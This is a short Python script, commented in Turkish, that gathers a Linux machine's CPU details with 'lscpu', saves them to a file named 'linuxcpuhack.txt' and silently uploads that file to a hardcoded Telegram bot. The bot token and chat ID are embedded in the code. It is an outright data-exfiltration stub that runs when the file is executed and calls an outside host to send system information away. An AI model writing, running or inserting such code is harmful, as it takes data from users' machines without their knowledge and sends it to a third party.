import requests 
import subprocess
 
TOKEN = "7012404778:AAHqzFHEmAq2egqfiNwnRs0XQXJ9M4BOa9c"
chat_id = "2099296970"

def cpubilgial_linux(): #Linux
    cpu_info = subprocess.run(["lscpu"], stdout=subprocess.PIPE, text=True)
    çıktı = cpu_info.stdout
    
    # CPU bilgilerini dosyaya yazma
    with open("linuxcpuhack.txt", "w") as dosya:
        dosya.write(çıktı) 
    
    # Dosya yolunu alarak API'ye gönderme
    dosyakonumu = subprocess.run(["realpath", "linuxcpuhack.txt"], stdout=subprocess.PIPE, text=True)
    dosyakonumu_str = dosyakonumu.stdout.strip()
    file_path = "linuxcpuhack.txt"
    
    api = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    
    # Dosyayı API'ye gönderme
    with open(file_path, "rb") as file:
        files = {"document": open(file_path, "rb")}
        response = requests.post(api, data={"chat_id": chat_id}, files=files)

# Fonksiyonu çağırma
cpubilgial_linux()
